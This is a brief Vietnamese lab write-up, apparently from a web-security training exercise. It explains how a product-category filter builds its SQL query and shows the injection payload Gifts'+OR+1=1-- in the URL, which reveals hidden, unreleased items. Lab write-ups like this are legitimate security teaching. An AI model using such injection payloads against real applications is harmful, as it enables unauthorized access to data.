### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện một truy vấn SQL:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Khi nhấp vào các nút, kết quả sẽ được lọc theo danh mục:

<img width="1882" height="589" alt="image" src="https://github.com/user-attachments/assets/8b1cd033-f310-47da-9d81-d0f922e1a683" />

Để hiển thị tất cả các giá trị, thêm OR 1=1 để hiển thị tất cả các danh mục:

/filter?category=Gifts'+OR+1=1--

<img width="1887" height="755" alt="image" src="https://github.com/user-attachments/assets/33d8e050-e165-4d80-aef1-e41e84dc81d7" />
